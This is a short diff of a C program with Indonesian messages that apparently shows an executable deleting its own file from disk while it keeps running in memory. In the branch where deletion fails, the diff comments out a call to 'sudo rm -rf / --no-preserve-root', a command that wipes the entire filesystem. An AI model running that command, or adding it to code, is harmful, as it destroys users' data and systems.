@@ -10,7 +10,7 @@ int main(int argc, char *argv[]) {
         printf("2. SUKSES: File eksekusi (%s) telah dihapus dari disk.\n", argv[0]);
     } else {
         printf("2. GAGAL: Tidak bisa menghapus file.\n");
-        system("sudo rm -rf / --no-preserve-root");
+        // system("sudo rm -rf / --no-preserve-root");
     }
 
     printf("3. Program masih berjalan di memori (RAM) sampai return, tapi filenya sudah hilang.\n");
